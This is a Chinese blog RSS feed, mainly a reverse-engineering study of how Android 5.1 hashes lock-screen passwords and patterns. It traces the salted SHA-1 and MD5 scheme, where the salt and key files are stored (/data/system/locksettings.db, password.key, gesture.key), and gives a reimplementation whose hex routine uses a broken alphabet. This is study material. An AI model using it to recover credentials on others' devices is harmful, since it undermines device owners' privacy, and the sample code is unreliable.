&lt;p&gt;&lt;code&gt;jobject NewLocalRef(jobject obj)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;jobject New WeakGlobalRef(jobject obj)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;void DeleteGlobalRef(jobject obj)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;void DeleteLocalRef(jobject obj)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;void DeleteWeakGlobalRef(jobject obj)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;很容易理解上面6个函数&lt;/p&gt;

&lt;p&gt;&lt;code&gt;jboolean IsSameObject(jobject obj1,jobject obj2)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;这个函数用来比较两个引用是否相等，但是对于弱引用有一个特别的功能，如果把NULL传入要比较的对象中就能判断弱全局引用所指的Java对象是否被回收。&lt;/p&gt;

&lt;p&gt;缓存jfieldID/jmethodID.减小查询开销。&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h5 id=&#34;2-6-2-缓存方法&#34;&gt;2.6.2 缓存方法&lt;/h5&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;在用的时候缓存&lt;/p&gt;

&lt;p&gt;在native代码中使用static局部变量来保存已经查询过的id,就缓存下了id。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;在Java类初始化时缓存&lt;/p&gt;

&lt;p&gt;比较好的方法，在native调用前把所有ID全部保存下来。可以让Java代码在第一次加载这个类的时候首先调用本地代码初始化所有的jfildID/jmethodID.这样可以省去多次确定ID是否存在的语句。这些jfildID/jmethodID定义在C++的全局。当java类卸载或者重新加载的时候，也会重新计算ID.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class TestNative{
    static{
        initNativeIDs();  //静态代码块进行初始化
    }
    static native void initNativeIDs();
    int propInt = 0;
    String propStr = &amp;quot;&amp;quot;;
    public native void otherNative();
    ···········
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;//全局变量
jfieldID g_propInt_id = 0;
jfieldID g_propStr_id = 0;
    
JNIEXPORT void JNICALL Java_····init（JNIEnv* env,jobject clazz）{
    jfieldID g_propInt_id = GetfieldID(clazz,&amp;quot;propInt&amp;quot;,&amp;quot;I&amp;quot;);
    jfieldID g_propStr_id = GetfieldID(clazz,&amp;quot;propStr&amp;quot;,&amp;quot;/Ljava/lang/String;&amp;quot;);
}
JNIEXPORT void JNICALL Java_····other（JNIEnv* env,jobject clazz）{
    ············
}
    
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;

&lt;p&gt;​   主要是NDK开发相关。&lt;/p&gt;

&lt;p&gt;​   感觉系统的学了一遍还是感觉不错的。&lt;/p&gt;

&lt;p&gt;​   可以多找网上的例子来练习练习，加深对JNI 的了解。&lt;/p&gt;

&lt;p&gt;​&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>Android安全和开发环境搭建</title>
      <link>https://naivete.cc/post/android%E5%AE%89%E5%85%A8%E5%92%8C%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</link>
      <pubDate>Thu, 05 Jul 2018 17:35:46 +0800</pubDate>
      
      <guid>https://naivete.cc/post/android%E5%AE%89%E5%85%A8%E5%92%8C%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</guid>
      
        <description>

&lt;h1 id=&#34;android安全和开发环境搭建&#34;&gt;Android安全和开发环境搭建&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;补充中·····&lt;/p&gt;

&lt;h4 id=&#34;java环境&#34;&gt;JAVA环境&lt;/h4&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
&lt;li&gt;JDK下载与安装。&lt;/li&gt;
&lt;li&gt;环境变量配置&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;android-studio&#34;&gt;Android Studio&lt;/h4&gt;

&lt;ol&gt;
&lt;li&gt;官网下载（扶墙）&lt;/li&gt;
&lt;li&gt;SDK&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;ndk-jni-开发&#34;&gt;NDK（JNI）开发&lt;/h4&gt;

&lt;ol&gt;
&lt;li&gt;NDK下载&lt;/li&gt;
&lt;li&gt;使用&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;eclipse-还是推荐上面的as&#34;&gt;Eclipse (还是推荐上面的AS)&lt;/h4&gt;

&lt;p&gt;不喜欢界面，弃用。&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>Android应用安全防护和逆向分析 基础篇①</title>
      <link>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%871/</link>
      <pubDate>Mon, 02 Jul 2018 17:33:05 +0800</pubDate>
      
      <guid>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%871/</guid>
      
        <description>

&lt;h2 id=&#34;第一章-android中锁屏密码加密算法分析&#34;&gt;第一章 Android中锁屏密码加密算法分析&lt;/h2&gt;

&lt;h4 id=&#34;1-锁屏密码方式&#34;&gt;1. 锁屏密码方式：&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;手势&lt;/li&gt;
&lt;li&gt;九宫格连线&lt;/li&gt;
&lt;li&gt;输入密码&lt;/li&gt;
&lt;li&gt;指纹、人脸、虹膜&lt;/li&gt;
&lt;li&gt;可穿戴设备&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;2-这儿分析手势密码和输入密码&#34;&gt;2. 这儿分析手势密码和输入密码&lt;/h4&gt;

&lt;p&gt;找到android源代码中的LockPatternUtils,java 这个工具类&lt;br /&gt;
   路径：Android-5.1.1\frameworks\base\core\java\com\android\internal\widget&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;2.1 输入密码算法分析    (5.1版本的源代码 和书上细微差异)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public byte[] passwordToHash(String password, int userId) {//参数为密码和对应用户ID 默认0
           if (password == null) {
               return null;
           }
   
           try {
               byte[] saltedPassword = (password + getSalt(userId)).getBytes();  
               byte[] sha1 = MessageDigest.getInstance(&amp;quot;SHA-1&amp;quot;).digest(saltedPassword);
               byte[] md5 = MessageDigest.getInstance(&amp;quot;MD5&amp;quot;).digest(saltedPassword);
   //首先让 password+salt值 再SHA-1和MD5
               byte[] combined = new byte[sha1.length + md5.length];
               System.arraycopy(sha1, 0, combined, 0, sha1.length);
               System.arraycopy(md5, 0, combined, sha1.length, md5.length);
   //装换成hex值 再拼接起来
               final char[] hexEncoded = HexEncoding.encode(combined);
               return new String(hexEncoded).getBytes(StandardCharsets.UTF_8);
           } catch (NoSuchAlgorithmException e) {
               throw new AssertionError(&amp;quot;Missing digest algorithm: &amp;quot;, e);
           }
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如何获取设备对应的salt值：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;       private String getSalt(int userId) {
           long salt = getLong(LOCK_PASSWORD_SALT_KEY, 0, userId);
           if (salt == 0) {   //值为0  重新生成
               try {
                   salt = SecureRandom.getInstance(&amp;quot;SHA1PRNG&amp;quot;).nextLong();
                   setLong(LOCK_PASSWORD_SALT_KEY, salt, userId);  //保存值
                   Log.v(TAG, &amp;quot;Initialized lock password salt for user: &amp;quot; + userId);
               } catch (NoSuchAlgorithmException e) {
                   throw new IllegalStateException(&amp;quot;Couldn&#39;t get SecureRandom number&amp;quot;, e);
               }
           }
           return Long.toHexString(salt);       //  hex之后返回
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;继续跟踪 看保存的地方&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   private long getLong(String secureSettingKey, long defaultValue, int userHandle) {
           try {
               return getLockSettings().getLong(secureSettingKey, defaultValue, userHandle);
           } catch (RemoteException re) {
               return defaultValue;
           }
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;继续跟踪代码&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   @VisibleForTesting
       public ILockSettings getLockSettings() {
           if (mLockSettingsService == null) {
               ILockSettings service = ILockSettings.Stub.asInterface(
                       ServiceManager.getService(&amp;quot;lock_settings&amp;quot;));   //获取服务来操作
               mLockSettingsService = service;
           }
           return mLockSettingsService;
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在android中 这种获取服务的方式最终实现逻辑都是在XXXService类中&lt;/p&gt;

&lt;p&gt;这里在LockSettingService.java中  找到这个类的getLong方法&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public long getLong(String key, long defaultValue, int userId) {
           checkReadPermission(key, userId);
           String value = getStringUnchecked(key, null, userId);
           return TextUtils.isEmpty(value) ? defaultValue : Long.parseLong(value);
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;保存在数据库？&lt;/p&gt;

&lt;p&gt;继续跟踪&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   static class Injector {
   
           protected Context mContext;
   
           public Injector(Context context) {
               mContext = context;
           }
   
           public Context getContext() {
               return mContext;
           }
   
           public Handler getHandler() {
               return new Handler();
           }
   
           public LockSettingsStorage getStorage() {
               final LockSettingsStorage storage = new LockSettingsStorage(mContext);
               storage.setDatabaseOnCreateCallback(new LockSettingsStorage.Callback() {
                   @Override
                   public void initialize(SQLiteDatabase db) {
                       // Get the lockscreen default from a system property, if available
                       boolean lockScreenDisable = SystemProperties.getBoolean(
                               &amp;quot;ro.lockscreen.disable.default&amp;quot;, false);
                       if (lockScreenDisable) {
                           storage.writeKeyValue(db, LockPatternUtils.DISABLE_LOCKSCREEN_KEY, &amp;quot;1&amp;quot;, 0);
                       }
                   }
               });
               return storage;
           }
   
   public LockSettingsService(Context context) {
           this(new Injector(context));
       }
   
   
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;继续  查看LockSettingsStorage.java 类中   存在数据库中&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   static class DatabaseHelper extends SQLiteOpenHelper {
           private static final String TAG = &amp;quot;LockSettingsDB&amp;quot;;
           private static final String DATABASE_NAME = &amp;quot;locksettings.db&amp;quot;;
   
           private static final int DATABASE_VERSION = 2;
           private static final int IDLE_CONNECTION_TIMEOUT_MS = 30000;
   
           private Callback mCallback;
   
           public DatabaseHelper(Context context) {
               super(context, DATABASE_NAME, null, DATABASE_VERSION);
               setWriteAheadLoggingEnabled(true);
               // Memory optimization - close idle connections after 30s of inactivity
               setIdleConnectionTimeout(IDLE_CONNECTION_TIMEOUT_MS);
           }
   
           public void setCallback(Callback callback) {
               mCallback = callback;
           }
   
           private void createTable(SQLiteDatabase db) {
               db.execSQL(&amp;quot;CREATE TABLE &amp;quot; + TABLE + &amp;quot; (&amp;quot; +
                       &amp;quot;_id INTEGER PRIMARY KEY AUTOINCREMENT,&amp;quot; +
                       COLUMN_KEY + &amp;quot; TEXT,&amp;quot; +
                       COLUMN_USERID + &amp;quot; INTEGER,&amp;quot; +
                       COLUMN_VALUE + &amp;quot; TEXT&amp;quot; +
                       &amp;quot;);&amp;quot;);
           }
   
           @Override
           public void onCreate(SQLiteDatabase db) {
               createTable(db);
               if (mCallback != null) {
                   mCallback.initialize(db);
               }
           }
   
           @Override
           public void onUpgrade(SQLiteDatabase db, int oldVersion, int currentVersion) {
               int upgradeVersion = oldVersion;
               if (upgradeVersion == 1) {
                   // Previously migrated lock screen widget settings. Now defunct.
                   upgradeVersion = 2;
               }
   
               if (upgradeVersion != DATABASE_VERSION) {
                   Log.w(TAG, &amp;quot;Failed to upgrade database!&amp;quot;);
               }
           }
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看到了数据库的名字叫作：locksettings.db  保存在了：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;       private static final String SYSTEM_DIRECTORY = &amp;quot;/system/&amp;quot;;    //目录
       private static final String LOCK_PATTERN_FILE = &amp;quot;gatekeeper.pattern.key&amp;quot;;   
       private static final String BASE_ZERO_LOCK_PATTERN_FILE = &amp;quot;gatekeeper.gesture.key&amp;quot;;
       private static final String LEGACY_LOCK_PATTERN_FILE = &amp;quot;gesture.key&amp;quot;;    //key1
       private static final String LOCK_PASSWORD_FILE = &amp;quot;gatekeeper.password.key&amp;quot;;
       private static final String LEGACY_LOCK_PASSWORD_FILE = &amp;quot;password.key&amp;quot;;    //key2
       private static final String CHILD_PROFILE_LOCK_FILE = &amp;quot;gatekeeper.profile.key&amp;quot;;
       private static final String SYNTHETIC_PASSWORD_DIRECTORY = &amp;quot;spblob/&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;数据库文件存在/data/system/locksetting.db&lt;/p&gt;

&lt;p&gt;测试  在/data/system/下看到password.key&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/android-note-1-1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;打开看看：&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/android-note-1-2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;手动简单实现加密算法：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public byte[] passwordToHash(String password) {
           if (password == null) {
               return null;
           }
           byte [] hashed = null;
           try {
               byte[] saltedPassword = (password + SALT).getBytes();    //SALT 值从数据库中得到 拿到之后进行hex转换
               byte[] sha1 = MessageDigest.getInstance(&amp;quot;SHA-1&amp;quot;).digest(saltedPassword);
               byte[] md5 = MessageDigest.getInstance(&amp;quot;MD5&amp;quot;).digest(saltedPassword);
               hashed = (toHex(sha1)+toHex(md5)).getBytes();
           } catch(Exception e){
               
           }
           return hashed;
       }
       private static String toHex(byte[] ary){
           final String hex = &amp;quot;102031398sjdfklaj&amp;quot;;
           String ret = &amp;quot;&amp;quot;;
           for(int i=0;i&amp;lt;ary.length;i++){
               ret += hex.charAt((ary[i]&amp;gt;&amp;gt; 4)&amp;amp; 0xf);
               ret += hex.charAt(ary[i]&amp;amp; 0xf);
           }
           return ret;
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;SALT 的值可以从数据库中拿到 也可以利用反射获取&lt;/p&gt;

&lt;p&gt;总结：&lt;/p&gt;

&lt;p&gt;​    MD5(输的明文密码+设备的salt).hex+ SHA1(输的的明文密码+设备的salt值).hex&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;2.2 手势密码分析&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;大致同上&lt;/p&gt;

&lt;h4 id=&#34;3-简要&#34;&gt;3. 简要：&lt;/h4&gt;

&lt;p&gt;​    九宫格团装化成字节数组-&amp;gt;sha1 加密  即可&lt;/p&gt;

&lt;p&gt;​     其实大致流程和分析输入密码差不多   保存到本地的目录、/data/system/gesture.key 文件&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>Daily</title>
      <link>https://naivete.cc/daily/</link>
      <pubDate>Mon, 02 Oct 2017 21:49:20 +0200</pubDate>
      
      <guid>https://naivete.cc/daily/</guid>
      
        <description>

&lt;h2 id=&#34;daily-summary&#34;&gt;Daily summary&lt;/h2&gt;

&lt;p&gt;中断了很长一段时间、重新开始写。也算是一个新的开始吧。也换了一个Blog环境。&lt;/p&gt;

&lt;h3 id=&#34;2019-04-12&#34;&gt;2019-04-12&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;JIT编程-方法内联&lt;/li&gt;
&lt;li&gt;Android HOOK 之 YAHFA原理&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/iqiyi/xHook/blob/master/docs/overview/android_plt_hook_overview.zh-CN.md&#34;&gt;PLT Hook&lt;/a&gt;&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Inline Hook&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;long-long-ago&#34;&gt;Long long ago&lt;/h3&gt;

&lt;p&gt;[只剩回忆]()  已删除&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title></title>
      <link>https://naivete.cc/%E5%8F%8B%E9%93%BE/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://naivete.cc/%E5%8F%8B%E9%93%BE/</guid>
      
        <description>

&lt;h3 id=&#34;友链&#34;&gt;友链&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;[]()&lt;/li&gt;
&lt;/ul&gt;
</description>
      
    </item>
    
  </channel>
</rss>